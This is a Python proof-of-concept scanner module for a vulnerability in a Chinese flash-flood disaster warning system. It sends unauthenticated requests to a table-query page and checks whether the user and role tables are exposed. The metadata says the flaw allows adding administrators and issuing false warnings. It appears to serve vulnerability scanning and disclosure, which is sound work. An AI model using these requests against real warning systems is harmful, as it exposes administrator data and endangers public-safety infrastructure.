# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'StrongSoft_0005' # 平台漏洞编号，留空
    name = '四创灾害预警系统 任意文件操作'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_OPERATION # 漏洞类型
    disclosure_date = '2014-10-08'  # 漏洞公布时间
    desc = '''
        福建四创软件开发的“山洪灾害预警监测系统”可查询任意数据表数据，并且可任意添加、删除管理员，直接导致预警系统沦陷，系统后台可任意发布预警信息。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '四创灾害预警系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '15088e44-c9cb-4a2e-a7e6-e57cdddf3c72'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            payload1 = "/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUser"
            payload2 = "/TableDataManage/BaseInforQueryContent.aspx?tabnm=Web_SystemUserRole"
            verify_url1 = self.target + payload1
            verify_url2 = self.target + payload2
            r1 = requests.get(verify_url1)
            if r1.status_code == 200 and "name: 'UserID'" in r1.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

            r2 = requests.get(verify_url2)
            if r2.status_code == 200 and "name: 'RoleName'" in r2.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
